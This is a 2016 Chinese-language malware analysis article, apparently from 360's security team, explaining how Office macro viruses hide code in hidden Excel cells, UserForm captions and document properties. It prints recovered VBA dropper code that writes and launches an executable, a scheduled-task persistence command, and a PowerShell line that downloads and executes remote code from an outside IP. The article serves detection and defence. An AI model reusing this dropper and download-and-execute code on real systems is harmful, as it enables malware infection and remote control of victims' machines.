@@ -1,0 +1,213 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">技术揭秘：宏病毒代码三大隐身术</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">360安全卫士</a> <span class="bull">·</span> <time title="2016/06/06 10:39" ui-time="" datetime="2016/06/06 10:39" class="published ng-binding ng-isolate-scope">2016/06/06 10:39</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 简介</h1><hr><p>作为一类古老的病毒，宏病毒随着勒索软件的兴起而卷土重来。尤其是在2016年，以Locky为代表的勒索软件利用Office宏肆虐传播，宏病毒也成为目前最活跃的病毒品种之一。</p><p>在与安全软件的对抗中，宏病毒使用了多种手段隐藏其恶意代码或数据，近期出现的新变种则是利用Excel表格的函数动态生成PE文件数据、设置远距离存放位置、隐藏显示、不同表切换等方式进行隐藏。接下来，360QEX引擎团队将对宏病毒代码流行的三类“隐身术”进行逐一揭秘。</p><h1>0x01 Excel表格隐藏数据</h1><hr><ul><li>样本文件md5: 48f202f903741e7a1722bfa6b4c051aa.xls</li><li>sha256: 083a05000c4b8e9a88a0ff8a95a3d9826dd389b440bb1781237ca124b0d986a7</li></ul><p>virustotal 扫描结果：</p><p><img alt="p1" img-src="af6cd9c949ab9f9859ac2f176fe6617bdb3627be.jpg"></p><p>样本对自身 VBAProject 进行了加密，</p><p><img alt="p2" img-src="3d0c606c8a2a268b97c13cbfa03c31e4fc3f7dee.jpg"></p><p>破解之后，看到了宏代码执行入口函数 Auto_Open，</p><pre><code>#!vb
+Sub Auto_Open()
+
+On Error Resume Next
+Application.DisplayAlerts = False
+Dim WB As Workbook
+Set WB = ActiveWorkbook
+
+Dim Sh1, Sh2, sh3 As Worksheet
+Set Sh1 = WB.Sheets(1)
+Set Sh2 = WB.Sheets(2)
+Set sh3 = WB.Sheets(3)
+Dim str As String
+str = Sh2.Cells(996, 40)
+Dim t As Date
+t = Now + TimeSerial(0, 0, 1)
+Application.OnTime t, str
+
+End Sub
+</code></pre><p>病毒作者使用 Application.OnTime 函数，间隔 1 秒，执行 字符串 “str” ，”str” 的值是从表格 Cells(996, 40) 中获取，当去查看表格中该处值时发现病毒更改了Excel单元格格式 ，把数据隐藏显示。</p><p>单元格格式设置为三个 <code>;;;</code> 时，单元格内容就会被隐藏。</p><p><img alt="p3" img-src="41703db96cca18374f7d390badb3409c04374ffb.jpg"></p><p>单元格的格式默认是显示的，初始设置为，</p><p><img alt="p4" img-src="65f3057c5ee7c217bae8b2122ed0340a7e535d62.jpg"></p><p>去掉隐藏后，查看表格中该值是 Fnslr12 ， 即病毒的功能入口函数名称，函数代码为，</p><pre><code>#!vb
+Sub Fnslr12()
+
+On Error Resume Next
+Application.DisplayAlerts = False
+Call Build
+Sheets(1).Select
+Dim WB As Workbook
+Set WB = ActiveWorkbook
+
+Dim Sh1, Sh2, sh3 As Worksheet
+Set Sh1 = WB.Sheets(1)
+Set Sh2 = WB.Sheets(2)
+
+If Cells(2, 1) &lt;&gt; "" Then
+GoTo skyhigh
+End If
+''' 以下省略
+</code></pre><p>因此，该函数为病毒代码的主功能函数。</p><p>此函数的功能有，</p><h3>1、Call Build</h3><p>调用 Build 函数， Build 函数功能为：在表格中动态生成，待写入 可执行文件（pe文件）所需的数据，其功能代码简略如下，</p><pre><code>#!vb
+Sub Build()
+
+Sheets(2).Select
+Set WB = ActiveWorkbook
+Set Sh1 = WB.Sheets(1)
+Set Sh2 = WB.Sheets(2)
+
+'bob location
+i = Sh2.Cells(1000, 12)
+j = Sh2.Cells(1000, 13)
+
+'index table location
+R = Sh2.Cells(1000, 10)
+C = Sh2.Cells(1000, 11)
+
+Counter = R
+Do While Sh2.Cells(Counter, C) &lt;&gt; ""
+
+If Sh2.Cells(Counter, C + 1) &lt;&gt; "" Then
+S1 = Sh2.Cells(Counter, C)
+S2 = Sh2.Cells(Counter, C + 1)
+End If
+Counter = Counter + 1
+Loop
+
+Cells(i, j).Select
+ Range(Selection, Selection.End(xlDown)).Select
+Selection.Cut
+Range("i1001").Select
+ActiveSheet.Paste
+Cells(1, 1).Select
+End Sub
+</code></pre><p>函数运行结果为，在 1001 行往下，依次每行填入数据。</p><p><img alt="p5" img-src="d2df82b688910a8aad7b6736553a08f10c797f44.jpg"></p><h3>2、对是否运行过一次做检查</h3><pre><code>#!vb
+If Cells(2, 1) &lt;&gt; "" Then
+GoTo skyhigh
+End If
+</code></pre><p>当运行过一次之后， Cells(2,1) 表格会被写入值，会在这里进入语句 Then ，执行 “Goto skyhigh” 语句， “skyhigh” 标记定位在函数尾部，即执行该语句后会退出该函数。</p><h3>3</h3><p>从代码意图猜测，病毒作者想在 <code>%userprofile% AppDataRoamingMicrosoftTemplates</code> 生成一个名为Macro1.vbs 的vbs文件 ,</p><pre><code>#!vb
+Dim Fnslr1 As String
+    Dim Fnslr2 As String
+    Fnslr2 = Environ(Sh2.Cells(998, 40)) &amp; "AppDataRoamingMicrosoftTemplatesMacro1.vbs"
+    ChDrive (Fnslr2)
+If Dir(Fnslr2) = "" Then
+Else
+End If
+</code></pre><p>其中，病毒拼凑生成文件的目录路径时，从表格 2 的Cells(998, 40) 中读取 ，该值为环境变量值 userprofile.</p><p><img alt="p6" img-src="e0a7a36b6ac3617a55ac46ace9eba743c043bad7.jpg"></p><p>只是，病毒作者并没有继续完善相关代码。实际测试运行样本也并没有生成该文件，猜测可能作者后续加入该功能，或者该功能已经被取消。</p><h3>4</h3><p>在 <code>%serprofile% AppDataRoamingMicrosoftTemplates</code> 目录生成可执行文件 Macro1.exe，</p><pre><code>#!vb
+Dim i As Double
+i = 1000
+    Fnslr1 = "Macro1.exe"
+    Fnslr2 = Environ(Sh2.Cells(998, 40)) &amp; "AppDataRoamingMicrosoftTemplates"
+    Fnslr3 = FreeFile()
+    Open Fnslr1 For Binary As Fnslr3
+    Do While Sh2.Cells(i, 9) &lt;&gt; ""
+            Fnslr11 = Sh2.Cells(i, 9)
+        If (Fnslr9 = True) Then
+            Fnslr8 = 1
+            Do While (Fnslr8 &lt; Len(Fnslr11))
+                Fnslr6 = Sh2.Cells(997, 40) &amp; Mid(Fnslr11, Fnslr8, 3)
+                Put #Fnslr3, , Fnslr6 
+                Fnslr8 = Fnslr8 + 3
+            Loop
+        End If
+        If Fnslr9 = False Then
+            Fnslr9 = True
+        End If
+         i = i + 1
+    Loop
+    Close #Fnslr3
+Dim Fnslr10 As String
+Fnslr10 = Fnslr1
+    Fnslr7 = Shell(Fnslr10, vbHide)
+Dim i As Double
+i = 1000
+    Fnslr1 = "Macro1.exe"
+    Fnslr2 = Environ(Sh2.Cells(998, 40)) &amp; "AppDataRoamingMicrosoftTemplates"
+    Fnslr3 = FreeFile()
+    Open Fnslr1 For Binary As Fnslr3
+    Do While Sh2.Cells(i, 9) &lt;&gt; ""
+            Fnslr11 = Sh2.Cells(i, 9)
+        If (Fnslr9 = True) Then
+            Fnslr8 = 1
+            Do While (Fnslr8 &lt; Len(Fnslr11))
+                Fnslr6 = Sh2.Cells(997, 40) &amp; Mid(Fnslr11, Fnslr8, 3)
+                Put #Fnslr3, , Fnslr6 
+                Fnslr8 = Fnslr8 + 3
+            Loop
+        End If
+        If Fnslr9 = False Then
+            Fnslr9 = True
+        End If
+         i = i + 1
+    Loop
+    Close #Fnslr3
+Dim Fnslr10 As String
+Fnslr10 = Fnslr1
+    Fnslr7 = Shell(Fnslr10, vbHide)
+</code></pre><p>写入 Macro1.exe 所需的数据，从 Excel 表格中 Cells(997, 40) 周围读取，实际测试数据开始位置是 1001行，</p><p><img alt="p7" img-src="7344edf7bc5717920f328402f69fcf06d481b3a0.jpg"></p><p>代码尾部使用 Shell 函数，启动生成的 Macro1.exe 。</p><p>文件信息</p><p><img alt="p8" img-src="48e343342241c645299b7f4a861c57bbd54d4586.jpg"></p><p>可执行文件是 x64位的，功能是，启动 powershell 附带 –enc 参数，执行一段 shellcode ，这段 shellcode是一个 reverse shell ，连接黑客服务器，等待下达命令。</p><p>此部分与下面创建计划任务不间断运行的功能呼应起来，此部分不是本文重点，不再详述。</p><h3>5、</h3><p>在 %serprofile% AppDataRoamingMicrosoftTemplates 目录生成 bat (cmd) 批处理脚本文件 Macro1.bat，</p><pre><code>#!vb
+Fnslr2 = Environ(Sh2.Cells(998, 40)) &amp; "AppDataRoamingMicrosoftTemplates"
+
+Dim User As String
+User = Environ(Sh2.Cells(998, 40))
+ Fname = Fnslr2 &amp; "Macro1.bat"
+FNum = FreeFile
+Open Fname For Output Access Write As #FNum
+
+WholeLine = "SchTasks /Create /SC HOURLY /TN " &amp; Sh2.Cells(1000, 3) &amp; "Macro1" &amp; Sh2.Cells(1000, 3) &amp; " /TR" &amp; " " &amp; User &amp; "AppDataRoamingMicrosoftTemplates" &amp; "Macro1.exe /ST 01:00"
+ Print #FNum, WholeLine
+Close #FNum
+
+Dim TempFileName As String
+TempFileName = Fnslr2 &amp; "Macro1.bat"
+Shell TempFileName, vbHide
+</code></pre><p>尾部使用 Shell 函数 启动该脚本，结果是在用户机器创建了一个计划任务， 每隔一小时运行一次 上面生成的 Macro1.exe 。</p><p><img alt="p9" img-src="bbf4f81d8638afb16bb3a5cd8bae16337bcb7c99.jpg"></p><h3>6、弹窗显示输入密码才能继续进行运行</h3><pre><code>#!vb
+pword = InputBox("Please enter a password to proceed", "Password Required", "*******")
+  Select Case pword
+  Case Is = ""
+   MsgBox "Try Again"
+    Case "Alon2016"
+      RP = 1
+
+     Case Is &lt;&gt; "Alon2016"
+         MsgBox "Try Again"
+  End Select
+</code></pre><p><img alt="p10" img-src="9a9f9913fdb014623da6dbf43a58a5e8f3b6704a.jpg"></p><p>从病毒代码中知道，要求输入的密码是 “Alon2016” 。</p><h3>7、</h3><p>接下来是现场清理和掩饰，删除调用Build 函数在表格生成的数据，在表格的开头显著位置填入在其他表格中保存的邮件收件人地址信息，</p><p><img alt="p11" img-src="2204ee772724dc6de6a2d467967c1311c22301d7.jpg"></p><p>小结：该样本的特别之处有：</p><ol><li>PE文件数据是使用函数动态生成</li><li>数据存放在Excel表格中，使用隐藏显示</li><li>数据存放位置很远，不容易被看到</li><li>病毒在不同的excel表中切换，给分析人员调试VBA代码增加困难</li><li>病毒运行完毕，清理现场，显示邮件地址列表，掩饰自身</li></ol><h1>0x02 VBA User Form隐藏代码</h1><hr><p>此类病毒把部分代码隐藏到 VBA 工程中的 用户控件（User Form）中，甚至把带有代码的控件最小化，使之不易被看到。</p><ul><li>样本文件md5：9266db6c7772f6c45411ff3a591b1374</li><li>sha256 : 9d11f2d2f0e0e5fd8a2ef552a5521920767d7939881443435296d0c600e4a71a</li></ul><p>virustotal 扫描结果：</p><p><img alt="p12" img-src="a1bb9bccbab45146167b239379168e6a30241485.jpg"></p><p>查看该文件的宏，</p><p><img alt="p13" img-src="69eba7e4d2b441f1bb73a2f29209c88dfc0b258a.jpg"></p><p>此文件看起来像是正常的SQL操作类的宏代码，但是当我们查看窗体 Ultra 时发现，</p><p><img alt="p14" img-src="d5e9d1c8e22fcc22bfeeb5673c50d1ace871df8e.jpg"></p><p>有个控件的Caption中存放了可疑数据如下，</p><pre><code>#!bash
+D!icrobrioft.XD!LHTTP10)Adodb.britr00aD!10)brih00ll.Application10)Wbricript.brih00ll10)Proc00bribri10)G00T10)T00D!P10)Typ0010)op00n10)writ0010)r00briponbri00Body10)briav00tofil0010)hendib00.00x00
+</code></pre><p>此数据在宏代码中被使用的位置为，</p><pre><code>#!vb
+CadenaCurrency(Ultra.CommandButton3.Caption, "00", "e")
+</code></pre><p>其中，CadenaCurrency 是一个简单的 Replace 调用，</p><pre><code>#!vb
+Public Function CadenaCurrency(A1 As String, A2 As String, A3 As String) As String
+CadenaCurrency = Replace(A1, A2, A3)
+End Function
+</code></pre><p>解密方法是，</p><pre><code>#!vb
+Dim aproblems As String
+ aproblems = CadenaCurrency(Ultra.CommandButton3.Caption, "00", "e")
+ aproblems = CadenaCurrency(aproblems, "D!", "M")
+ aproblems = CadenaCurrency(aproblems, "bri", "s")
+ constans_problems = Split(aproblems, "10)")
+</code></pre><p>解密为，</p><pre><code>#!bash
+Microsoft.XMLHTTP
+Adodb.stream
+shell.Application
+Wscript.shell
+Process
+GeT
+Temp
+Type
+open
+write
+responseBody
+savetofile
+hendibe.exe
+</code></pre><p>几个字符串呈现出非常明显的意图，下载（Microsoft.XMLHTTP）+ 写文件（Adodb.stream）+ 执行（shell.Application / Wscript.shell）。</p><p>此样本因为代码有问题，没能成功运行起来。找到宏代码中使用 Microsoft.XMLHTTP 对象下载文件的位置，加上断点调试，起先因为作者疏忽，忘记书写一个双引号，导致编译失败，</p><p><img alt="p15" img-src="3d992bd10551d0baea1b955677ff1f464a9926e6.jpg"></p><p>之后，运行到下载文件处时，出现了报错。</p><p><img alt="p16" img-src="1b908e3bbdd7475fa1f9db8712a235af27389acc.jpg"></p><h1>0x03 文档内建属性隐藏代码</h1><hr><p>此类病毒把代码核心恶意部分放入文档的内建属性中。</p><ul><li>样本文件md5：0ce81eda6b6886163cf5dadffecc0df9</li><li>sha256: 23d07a51f7a14a95a1efc55ad3f18cd5a71607156cd325256d43f0b68cfb62cd</li></ul><p>virustotal 扫描结果:</p><p><img alt="p17" img-src="08edfa1f5940edd419b7aaae0313186575e954df.jpg"></p><p>此样本的vba 宏代码只有1个文件，很简短，</p><pre><code>#!vb
+Attribute VB_Name = "NewMacros"
+Sub Auto_Open()
+Call winshell
+End Sub
+
+Sub AutoOpen()
+Call winshell
+End Sub
+
+Function winshell() As Object
+    On Error Resume Next
+    Err.Clear
+
+    Dim ps As String
+    ps = ActiveDocument.BuiltInDocumentProperties("Manager").Value
+    Dim Obj As Object
+    Set Obj = CreateObject("WScript.Shell")
+    Obj.Run ps, 0
+
+Application.DisplayAlerts = False
+End Function
+</code></pre><p>响应两个文档打开事件，AutoOpen 与Auto_Open，直接执行 winshell函数， winshell函数读取文件内建属性，Manager 的值，直接执行起来。Manager值，我们使用右键文件属性，查看为，</p><p><img alt="p18" img-src="aacd056dff3659ee2fc380d004962ea7f4da1ef9.jpg"></p><pre><code>#!powershell
+powershell.exe -nop -w hidden -c $b=new-object net.webclient;$b.proxy=[Net.WebRequest]::GetSystemWebProxy();$b.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $b.downloadstring('http://37.28.154.204:8081/ygklKbyIVG51Kol');
+</code></pre><p>是一段 Powershell 执行的脚本代码，从指定 URL （<code>http://37.28.154.204:8081/ygklKbyIVG51Kol</code>） 下载文件。目前测试此URL已经无法访问。</p><h1>0x04 总结</h1><hr><p>以加密勒索为代表的病毒，越来越多的使用Office宏,js,vbs等非Pe文件来传播。通过脚本代码动态向Windows 目录中释放可执行文件或者从服务器下载可执行文件。</p><p>非PE病毒查杀引擎QEX是 360安全产品中负责查杀宏病毒及vbs、js、html等脚本病毒的独有引擎。上述样本QEX引擎均已查杀。</p><p>在这里也提醒 Microsoft Office 文档系列软件的使用用户，</p><ol><li><p>如日常无使用宏的需求，请禁用 Office 宏，禁用方式参考</p><p><a href="https://support.office.com/zh-cn/article/%E5%90%AF%E7%94%A8%E6%88%96%E7%A6%81%E7%94%A8-Office-%E6%96%87%E6%A1%A3%E4%B8%AD%E7%9A%84%E5%AE%8F-7b4fdd2e-174f-47e2-9611-9efe4f860b12">https://support.office.com/zh-cn/article/%E5%90%AF%E7%94%A8%E6%88%96%E7%A6%81%E7%94%A8-Office-%E6%96%87%E6%A1%A3%E4%B8%AD%E7%9A%84%E5%AE%8F-7b4fdd2e-174f-47e2-9611-9efe4f860b12</a></p></li><li><p>对于经常使用宏工作的用户，请安装安全软件，定期更新病毒库，对于他人发送的文档，在打开之前请先扫描。</p></li></ol><h1>0x05 Reference</h1><hr><ul><li><a href="https://blogs.technet.microsoft.com/mmpc/2016/05/17/malicious-macro-using-a-sneaky-new-trick/">https://blogs.technet.microsoft.com/mmpc/2016/05/17/malicious-macro-using-a-sneaky-new-trick/</a></li><li><a href="http://www.freebuf.com/articles/system/104221.html">http://www.freebuf.com/articles/system/104221.html</a></li><li><a href="https://www.fireeye.com/blog/threat-research/2016/04/ghosts_in_the_endpoi.html">https://www.fireeye.com/blog/threat-research/2016/04/ghosts&#95;in&#95;the_endpoi.html</a></li><li><a href="http://superuser.com/questions/807926/how-to-bypass-the-vba-project-password-from-excel">http://superuser.com/questions/807926/how-to-bypass-the-vba-project-password-from-excel</a></li><li><a href="https://support.office.com/zh-cn/article/%E5%90%AF%E7%94%A8%E6%88%96%E7%A6%81%E7%94%A8-Office-%E6%96%87%E6%A1%A3%E4%B8%AD%E7%9A%84%E5%AE%8F-7b4fdd2e-174f-47e2-9611-9efe4f860b12">https://support.office.com/zh-cn/article/%E5%90%AF%E7%94%A8%E6%88%96%E7%A6%81%E7%94%A8-Office-%E6%96%87%E6%A1%A3%E4%B8%AD%E7%9A%84%E5%AE%8F-7b4fdd2e-174f-47e2-9611-9efe4f860b12</a></li><li><a href="http://bobao.360.cn/learning/detail/2827.html">http://bobao.360.cn/learning/detail/2827.html</a></li></ul><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">test</span> <span class="reply-time">2016-06-06 16:13:48</span></div><p></p><p>1/54</p><p></p></div></div></div></div></div></main>
